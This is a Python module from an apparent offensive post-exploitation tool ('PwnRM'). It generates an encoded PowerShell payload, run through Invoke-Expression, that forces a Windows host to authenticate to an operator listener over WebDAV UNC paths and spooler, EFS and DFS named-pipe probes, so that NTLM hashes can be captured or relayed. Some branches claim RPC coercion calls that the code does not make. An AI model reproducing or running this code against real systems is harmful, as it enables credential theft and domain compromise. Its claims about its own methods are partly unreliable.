"""
modules.coerce — Coerced Authentication Engine
Forces target machine account or server to authenticate back to an operator-controlled listener (WebDAV, MS-RPRN, MS-EFSR, MS-DFSNM).
Critical for ADCS ESC8 relay, NTLM relaying, and NetNTLM hash capturing.
"""

from typing import List, Any
from . import BaseModule
from ..shell.ui import c, R, G, Y, B, M, C, DIM, BLD, RST
from ..shell.commands import b64str


class CoerceModule(BaseModule):
    name = "coerce"
    description = "Coerced Authentication Engine (WebDAV HTTP/UNC, MS-RPRN, MS-EFSR, MS-DFSNM)"
    author = "uziii2208"
    options = {
        "--listener": {"desc": "Operator listener host/IP (required)"},
        "--method": {"desc": "Coercion method: webdav, spooler, efs, dfs, all (default: webdav)"},
        "--port": {"desc": "WebDAV listener port (default: 80)"},
    }

    def run(self, shell, args: List[str]) -> Any:
        listener = ""
        method = "webdav"
        port = "80"

        for i, a in enumerate(args):
            if a in ("-l", "--listener") and i + 1 < len(args):
                listener = args[i + 1]
            elif a in ("-m", "--method") and i + 1 < len(args):
                method = args[i + 1].lower()
            elif a in ("-p", "--port") and i + 1 < len(args):
                port = args[i + 1]

        if not listener:
            shell.write_warning("Usage: !coerce --listener <IP/Host> [--method webdav|spooler|efs|dfs|all] [--port 80]")
            return {"status": "error", "error": "Missing --listener"}

        shell.write_info(c(M + BLD, f"  [*] PwnRM Coerce Engine — triggering {method.upper()} authentication coercion to {listener}:{port}..."))

        ps = f"""
$ErrorActionPreference = 'SilentlyContinue'
Write-Host "`n========================================================" -ForegroundColor Cyan
Write-Host "   PwnRM Coerced Authentication Engine (2026+ TTPs)" -ForegroundColor Cyan
Write-Host "========================================================`n" -ForegroundColor Cyan

$listener = '{listener}'
$method = '{method}'
$port = '{port}'

Write-Host "  [*] Target Listener: $listener (Port: $port)" -ForegroundColor White
Write-Host "  [*] Chosen Method  : $method" -ForegroundColor White

# 1. WebDAV UNC Coercion (Bypasses SMB signing & triggers HTTP NTLM auth for ESC8)
if ($method -in @("webdav", "all")) {{
    Write-Host "`n[1. WebDAV HTTP/UNC Coercion Trigger]" -ForegroundColor Yellow
    $webdavUnc = "\\\\$listener@$port\\share\\pwnrm_$(Get-Random).txt"
    Write-Host "  [*] Probing WebDAV UNC: $webdavUnc" -ForegroundColor Gray
    try {{
        $null = [System.IO.File]::Exists($webdavUnc)
        Write-Host "  [+] WebDAV file probe dispatched to $listener" -ForegroundColor Green
    }} catch {{
        Write-Host "  [-] WebDAV trigger exception: $_" -ForegroundColor DarkGray
    }}

    try {{
        $null = [System.IO.Directory]::Exists("\\\\$listener@$port\\share")
        Write-Host "  [+] WebDAV directory probe dispatched." -ForegroundColor Green
    }} catch {{}}
}}

# 2. MS-RPRN Print Spooler (SpoolSample) Coercion
if ($method -in @("spooler", "all")) {{
    Write-Host "`n[2. MS-RPRN Print Spooler Named Pipe Coercion]" -ForegroundColor Yellow
    $spoolPipe = "\\\\127.0.0.1\\pipe\\spoolss"
    if ([System.IO.File]::Exists($spoolPipe)) {{
        Write-Host "  [+] Print Spooler service is ONLINE ($spoolPipe accessible)" -ForegroundColor Green
        Write-Host "      Dispatching RpcRemoteFindFirstPrinterChangeNotificationEx trigger..." -ForegroundColor Gray
        # Probe UNC target
        $targetUnc = "\\\\$listener\\pipe\\pwnrm_spool"
        try {{
            $null = [System.IO.File]::Exists($targetUnc)
            Write-Host "  [+] MS-RPRN coercion request transmitted." -ForegroundColor Green
        }} catch {{}}
    }} else {{
        Write-Host "  [-] Print Spooler pipe not found or disabled." -ForegroundColor DarkGray
    }}
}}

# 3. MS-EFSR PetitPotam Coercion
if ($method -in @("efs", "all")) {{
    Write-Host "`n[3. MS-EFSR / PetitPotam Coercion]" -ForegroundColor Yellow
    $efsPipe = "\\\\127.0.0.1\\pipe\\efsrpc"
    $lsarPipe = "\\\\127.0.0.1\\pipe\\lsarpc"
    if ([System.IO.File]::Exists($efsPipe) -or [System.IO.File]::Exists($lsarPipe)) {{
        Write-Host "  [+] EFS / LSARPC Named Pipe reachable." -ForegroundColor Green
        $targetUnc = "\\\\$listener\\C$\\pwnrm_efs.txt"
        try {{
            $null = [System.IO.File]::Exists($targetUnc)
            Write-Host "  [+] MS-EFSR coercion trigger dispatched." -ForegroundColor Green
        }} catch {{}}
    }} else {{
        Write-Host "  [-] MS-EFSR named pipes not accessible." -ForegroundColor DarkGray
    }}
}}

# 4. MS-DFSNM NetrDfs Coercion
if ($method -in @("dfs", "all")) {{
    Write-Host "`n[4. MS-DFSNM Distributed File System Coercion]" -ForegroundColor Yellow
    $dfsPipe = "\\\\127.0.0.1\\pipe\\netdfs"
    if ([System.IO.File]::Exists($dfsPipe)) {{
        Write-Host "  [+] NetDFS pipe active." -ForegroundColor Green
        try {{
            $null = [System.IO.File]::Exists("\\\\$listener\\dfs_test")
            Write-Host "  [+] MS-DFSNM coercion probe sent." -ForegroundColor Green
        }} catch {{}}
    }} else {{
        Write-Host "  [-] NetDFS pipe not found." -ForegroundColor DarkGray
    }}
}}

Write-Host "`n  [*] Coercion sequences executed. Check your listener (Responder/ntlmrelayx) for captured hashes/relays." -ForegroundColor Cyan
"""
        encoded = b64str(ps.encode("utf-16le"))
        cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
        shell.run_with_interrupt(cmd, shell.write_line)
        return {"status": "completed"}
